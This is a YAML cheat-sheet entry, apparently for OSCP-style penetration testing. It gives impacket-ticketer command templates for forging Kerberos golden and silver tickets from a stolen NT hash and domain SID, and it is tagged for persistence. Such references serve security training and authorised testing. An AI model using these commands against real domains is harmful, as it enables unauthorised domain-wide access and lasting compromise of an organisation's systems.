---
variants:
  - label: golden
    command: |
      impacket-ticketer -dc-ip $DCIP -nthash $HASH -domain-sid $SID -domain $DOMAIN -user-id $UID -groups '$GROUPS' $USER
  - label: silver
    command: |
      impacket-ticketer -dc-ip $DCIP -nthash $HASH -domain-sid $SID -domain $DOMAIN -spn $SPN $USER
description: Forge a Kerberos ticket with impacket, by ticket type.
os: [Linux]
category: [oscp, cli]
have: [hash]
service: [Kerberos]
phase: [Persistence]
references:
  - https://github.com/fortra/impacket
---
